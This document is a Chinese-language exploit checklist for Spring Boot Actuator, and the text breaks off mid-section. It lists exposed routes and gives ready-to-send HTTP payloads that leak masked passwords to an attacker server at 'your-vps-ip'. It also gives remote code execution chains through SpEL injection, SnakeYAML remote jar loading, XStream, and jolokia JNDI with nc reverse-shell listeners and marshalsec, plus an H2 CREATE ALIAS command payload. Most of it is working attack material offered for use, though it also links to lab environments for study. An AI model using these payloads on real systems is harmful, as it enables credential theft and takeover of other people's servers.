# SpringBootVulnerability

Spring Boot Vulnerability Exploit Check List

### 零：路由和版本

#### 0x01：路由知识

* 有些程序员会自定义 `/manage`、`/management` 、**项目 App 相关名称**为 spring 根路径
* Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 `/` ，2.x 版本则统一以 `/actuator` 为起始路径
* Spring Boot Actuator 默认的内置路由名字，如 `/env` 有时候也会被程序员修改，比如修改成 `/appenv`

#### 0x02：版本知识

> Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。

**组件版本的相互依赖关系：**

| 依赖项                        | 版本列表及依赖组件版本                                                                                                          |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| spring-boot-starter-parent | [spring-boot-starter-parent](https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent) |
| spring-boot-dependencies   | [spring-boot-dependencies](https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies)     |
| spring-cloud-dependencies  | [spring-cloud-dependencies](https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies)  |

**Spring Cloud 与 Spring Boot 版本之间的依赖关系：**

| Spring Cloud 大版本 | Spring Boot 版本                 |
| ---------------- | ------------------------------ |
| Angel            | 兼容 Spring Boot 1.2.x           |
| Brixton          | 兼容 Spring Boot 1.3.x、1.4.x     |
| Camden           | 兼容 Spring Boot 1.4.x、1.5.x     |
| Dalston          | 兼容 Spring Boot 1.5.x，不兼容 2.0.x |
| Edgware          | 兼容 Spring Boot 1.5.x，不兼容 2.0.x |
| Finchley         | 兼容 Spring Boot 2.0.x，不兼容 1.5.x |
| Greenwich        | 兼容 Spring Boot 2.1.x           |
| Hoxton           | 兼容 Spring Boot 2.2.x           |

**Spring Cloud 小版本号的后缀及含义:**

| 小版本号后缀         | 含义                      |
| -------------- | ----------------------- |
| BUILD-SNAPSHOT | 快照版，代码不是固定，处于变化之中       |
| MX             | 里程碑版                    |
| RCX            | 候选发布版                   |
| RELEASE        | 正式发布版                   |
| SRX            | (修复错误和 bug 并再次发布的)正式发布版 |

### 一：信息泄露

#### 0x01：路由地址及接口调用详情泄漏

> 开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等

直接访问以下两个 swagger 相关路由，验证漏洞是否存在：

```
/v2/api-docs
/swagger-ui.html
```

其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：

```
/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```

除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：

```
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
```

**一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞**，但是以 "**默认安全**" 来讲，不暴露出这些信息更加安全。

对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。

#### 0x02：配置不当而暴露的路由

> 主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置

参考 [production-ready-endpoints](https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints) 和 [spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)，可能因为配置不当而暴露的默认内置路由可能会有：

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents  
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
```

其中对寻找漏洞比较重要接口的有：

*   `/env`、`/actuator/env`

    GET 请求 `/env` 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；

    同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。
*   `/refresh`、`/actuator/refresh`

    POST 请求 `/env` 接口设置属性后，可同时配合 POST 请求 `/refresh` 接口刷新属性变量来触发相关 RCE 漏洞。
*   `/restart`、`/actuator/restart`

    暴露出此接口的情况较少；可以配合 POST请求 `/env` 接口设置属性后，再 POST 请求 `/restart` 接口重启应用来触发相关 RCE 漏洞。
*   `/jolokia`、`/actuator/jolokia`

    可以通过 `/jolokia/list` 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。
*   `/trace`、`/actuator/httptrace`

    一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。

#### 0x03：获取被星号脱敏的密码的明文 (方法一)

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

**利用条件：**

* 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
* 目标使用了 `jolokia-core` 依赖（版本要求暂未知）

**利用方法：**

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： jolokia 调用相关 Mbean 获取明文**

将下面示例中的 `security.user.password` 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 `value` 键中。

* 调用 `org.springframework.boot` Mbean

> 实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法

spring 1.x

```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x

```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

* 调用 `org.springframework.cloud.context.environment` Mbean

> 实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法

spring 1.x

```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x

```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

* 调用其他 Mbean

> 目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。

#### 0x04：获取被星号脱敏的密码的明文 (方法二)

**利用条件：**

* 可以 GET 请求目标网站的 `/env`
* 可以 POST 请求目标网站的 `/env`
* 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
* 目标使用了 `spring-cloud-starter-netflix-eureka-client` 依赖
* 目标可以请求攻击者的服务器（请求可出外网）

**利用方法：**

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： 使用 nc 监听 HTTP 请求**

在自己控制的外网服务器上监听 80 端口：

```
nc -lvk 80
```

**步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性**

将下面 `http://value:${security.user.password}@your-vps-ip` 中的 `security.user.password` 换成自己想要获取的对应的星号 \* 遮掩的属性名；

`your-vps-ip` 换成自己外网服务器的真实 ip 地址。

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
```

**步骤四： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

**步骤五： 解码属性值**

正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 `Authorization` 头内容：

```
Authorization: Basic dmFsdWU6MTIzNDU2
```

将其中的 `dmFsdWU6MTIzNDU2`部分使用 base64 解码，即可获得类似明文值 `value:123456`，其中的 `123456` 即是目标星号 \* 脱敏前的属性值明文。

#### 0x05：获取被星号脱敏的密码的明文 (方法三)

**利用条件：**

* 通过 POST `/env` 设置属性触发目标对外网指定地址发起任意 http 请求
* 目标可以请求攻击者的服务器（请求可出外网）

**利用方法：**

> 参考 UUUUnotfound 提出的 [issue-1](https://github.com/LandGrey/SpringBootVulExploit/issues/1)，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： 使用 nc 监听 HTTP 请求**

在自己控制的外网服务器上监听 80 端口：

```
nc -lvk 80
```

**步骤三： 触发对外 http 请求**

* `spring.cloud.bootstrap.location` 方法（**同时适用于**明文数据中有特殊 url 字符的情况）

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
```

* `eureka.client.serviceUrl.defaultZone` 方法（**不适用于**明文数据中有特殊 url 字符的情况）

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
```

**步骤四： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

#### 0x06：获取被星号脱敏的密码的明文 (方法四)

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 \* 号替换达到脱敏的效果

**利用条件：**

* 可正常 GET 请求目标 `/heapdump` 或 `/actuator/heapdump` 接口

**利用方法：**

**步骤一： 找到想要获取的属性名**

GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 \* 遮掩的属性值对应的属性名。

**步骤二： 下载 jvm heap 信息**

> 下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G

`GET` 请求目标的 `/heapdump` 或 `/actuator/heapdump` 接口，下载应用实时的 JVM 堆信息

**步骤三： 使用 MAT 获得 jvm heap 中的密码明文**

参考 [文章](https://landgrey.me/blog/16/) 方法，使用 [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) 工具的 **OQL** 语句

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))

或

select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))
```

辅助用 "**password**" 等关键词快速过滤分析，获得密码等相关敏感信息的明文。

### 二：远程代码执行

> 由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准

#### 0x01：whitelabel error page SpEL RCE

**利用条件：**

* spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0
* 至少知道一个触发 springboot 默认错误页面的接口及参数名

**利用方法：**

**步骤一：找到一个正常传参处**

比如发现访问 `/article?id=xxx` ，页面会报状态码为 500 的错误： `Whitelabel Error Page`，则后续 payload 都将会在参数 id 处尝试。

**步骤二：执行 SpEL 表达式**

输入 `/article?id=${7*7}` ，如果发现报错页面将 7\*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。

由字符串格式转换成 `0x**` java 字节形式，方便执行任意代码：

```python
# coding: utf-8

result = ""
target = 'open -a Calculator'
for x in target:
    result += hex(ord(x)) + ","
print(result.rstrip(','))
```

执行 `open -a Calculator`计算器命令

```java
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
```

**漏洞原理：**

1. spring boot 处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中
2. 此时 URL 中的参数值会用 `parseStringValue` 方法进行递归解析
3. 其中 `${}` 包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞

**漏洞分析：**

​ [SpringBoot SpEL表达式注入漏洞-分析与复现](https://www.cnblogs.com/litlife/p/10183137.html)

**漏洞环境：**

[repository/springboot-spel-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce)

正常访问：

```
http://127.0.0.1:9091/article?id=66
```

执行 `open -a Calculator` 命令：

```java
http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
```

#### 0x02：spring cloud SnakeYAML RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
* 目标依赖的 `spring-cloud-starter` 版本 < 1.3.0.RELEASE
* 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

**利用方法：**

**步骤一： 托管 yml 和 jar 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在网站根目录下放置后缀为 `yml` 的文件 `example.yml`，内容如下：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/example.jar"]
  ]]
]
```

在网站根目录下放置后缀为 `jar` 的文件 `example.jar`，内容是要执行的代码，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)。

**步骤二： 设置 spring.cloud.bootstrap.location 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
```

**步骤三： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

**漏洞原理：**

1. spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址
2. refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
3. SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作
4. 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
5. 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化
6. 实例化类时执行恶意代码，造成 RCE 漏洞

**漏洞分析：**

​ [Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记](https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/)

**漏洞环境：**

[repository/springcloud-snakeyaml-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce)

正常访问：

```
http://127.0.0.1:9092/env
```

#### 0x03：eureka xstream deserialization RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
* 目标使用的 `eureka-client` < 1.8.7（通常包含在 `spring-cloud-starter-netflix-eureka-client` 依赖中）
* 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

**利用方法：**

**步骤一：架设响应恶意 XStream payload 的网站**

提供一个依赖 Flask 并符合要求的 [python 脚本示例](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)，作用是利用目标 Linux 机器上自带的 python 来反弹shell。

使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。

**步骤二：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```
nc -lvp 443
```

**步骤三：设置 eureka.client.serviceUrl.defaultZone 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
```

**步骤四：刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json
```

**漏洞原理：**

1. eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址
2. refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload
3. 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞

**漏洞分析：**

​ [Spring Boot Actuator从未授权访问到getshell](https://www.freebuf.com/column/234719.html)

**漏洞环境：**

[repository/springboot-eureka-xstream-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce)

正常访问：

```
http://127.0.0.1:9093/env
```

#### 0x04：jolokia logback JNDI RCE

**利用条件：**

* 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
* 目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
* 目标可以请求攻击者的 HTTP 服务器（请求可出外网）
* 普通 JNDI 注入受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过

**利用方法：**

**步骤一：查看已存在的 MBeans**

访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。

**步骤二：托管 xml 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在根目录放置以 `xml` 结尾的 `example.xml` 文件，内容如下：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/JNDIObject" as="appName" />
</configuration>
```

**步骤三：准备要执行的 Java 代码**

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) `JNDIObject.java`，

使用兼容低版本 jdk 的方式编译：

```
javac -source 1.5 -target 1.5 JNDIObject.java
```

然后将生成的 `JNDIObject.class` 文件拷贝到 **步骤二** 中的网站根目录。

**步骤四：架设恶意 ldap 服务**

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 ldap 服务：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
```

**步骤五：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```
nc -lv 443
```

**步骤六：从外部 URL 地址加载日志配置文件**

> ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。

替换实际的 your-vps-ip 地址访问 URL 触发漏洞：

```
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
```

**漏洞原理：**

1. 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法
2. 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容
3. 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
4. xml 文件中利用 `logback` 依赖的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
5. 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞

**漏洞分析：**

​ [spring boot actuator rce via jolokia](https://xz.aliyun.com/t/4258)

**漏洞环境：**

[repository/springboot-jolokia-logback-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce)

正常访问：

```
http://127.0.0.1:9094/env
```

#### 0x05：jolokia Realm JNDI RCE

**利用条件：**

* 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
* 目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean
* 目标可以请求攻击者的服务器（请求可出外网）
* 普通 JNDI 注入受目标 JDK 版本影响，jdk < 6u141/7u131/8u121(RMI)，但相关环境可绕过

**利用方法：**

**步骤一：查看已存在的 MBeans**

访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。

**步骤二：准备要执行的 Java 代码**

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) `JNDIObject.java`。

**步骤三：托管 class 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

将**步骤二**中编译好的 class 文件拷贝到 HTTP 服务器根目录。

**步骤四：架设恶意 rmi 服务**

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 rmi 服务：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
```

**步骤五：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```
nc -lvp 443
```

**步骤六：发送恶意 payload**

根据实际情况修改 [springboot-realm-jndi-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。

**漏洞原理：**

1. 利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm
2. 设置 connectionURL 地址为 RMI Service URL
3. 设置 contextFactory 为 RegistryContextFactory
4. 停止 Realm
5. 启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞

**漏洞分析：**

​ [Yet Another Way to Exploit Spring Boot Actuators via Jolokia](https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html)

**漏洞环境：**

[repository/springboot-jolokia-logback-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce)

正常访问：

```
http://127.0.0.1:9094/env
```

#### 0x06：restart h2 database query RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/restart` 接口重启应用
* 存在 `com.h2database.h2` 依赖（版本要求暂未知）

**利用方法：**

**步骤一：设置 spring.datasource.hikari.connection-test-query 属性**

> ⚠️ 下面payload 中的 'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发

spring 1.x（无回显执行命令）

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
```

spring 2.x（无回显执行命令）

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
```

**步骤二：重启应用**

spring 1.x

```
POST /restart
Content-Type: application/x-www-form-urlencoded
```

spring 2.x

```
POST /actuator/restart
Content-Type: application/json
```

**漏洞原理：**

1. spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
2. 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句
3. restart 重启应用，会建立新的数据库连接
4. 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞

**漏洞分析：**

​ [remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

**漏洞环境：**

[repository/springboot-h2-database-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce)

正常访问：

```
http://127.0.0.1:9096/actuator/env
```

#### 0x07：h2 database console JNDI RCE

**利用条件：**

* 存在 `com.h2database.h2` 依赖（版本要求暂未知）
* spring 配置中启用 h2 console `spring.h2.console.enabled=true`
* 目标可以请求攻击者的服务器（请求可出外网）
* JNDI 注入受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1（LDAP 方式）

**利用方法：**

**步骤一：访问路由获得 jsessionid**

直接访问目标开启 h2 console 的默认路由 `/h2-console`，目标会跳转到页面 `/h2-console/login.jsp?jsessionid=xxxxxx`，记录下实际的 `jsessionid=xxxxxx` 值。

**步骤二：准备要执行的 Java 代码**

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java) `JNDIObject.java`，

使用兼容低版本 jdk 的方式编译：

```
javac -source 1.5 -target 1.5 JNDIObject.java
```

然后将生成的 `JNDIObject.class` 文件拷贝到 **步骤二** 中的网站根目录。

**步骤三：托管 class 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

将**步骤二**中编译好的 class 文件拷贝到 HTTP 服务器根目录。

**步骤四：架设恶意 ldap 服务**

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 ldap 服务：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
```

**步骤五：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```
nc -lv 443
```

**步骤六：发包触发 JNDI 注入**

根据实际情况，替换下面数据中的 `jsessionid=xxxxxx`、`www.example.com` 和 `ldap://your-vps-ip:1389/JNDIObject`

```
POST /h2-console/login.do?jsessionid=xxxxxx
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx

language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://your-vps-ip:1389/JNDIObject&user=&password=
```

**漏洞分析：**

​ [Spring Boot + H2数据库JNDI注入](https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ)

**漏洞环境：**

[repository/springboot-h2-database-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce)

正常访问：

```
http://127.0.0.1:9096/h2-console
```

#### 0x08：mysql jdbc deserialization RCE

**利用条件：**

* 可以 POST 请求目标网站的 `/env` 接口设置属性
* 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
* 目标环境中存在 `mysql-connector-java` 依赖
* 目标可以请求攻击者的服务器（请求可出外网）

**利用方法：**

**步骤一：查看环境依赖**

GET 请求 `/env` 或 `/actuator/env`，搜索环境变量（classpath）中是否有 `mysql-connector-java` 关键词，并记录下其版本号（5.x 或 8.x）；

搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 `commons-collections`、`Jdk7u21`、`Jdk8u20` 等；

搜索 `spring.datasource.url` 关键词，记录下其 `value` 值，方便后续恢复其正常 jdbc url 值。

**步骤二：架设恶意 rogue mysql server**

在自己控制的服务器上运行 [springboot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) 脚本，并使用 [ysoserial](https://github.com/frohoff/ysoserial) 自定义要执行的命令：

```
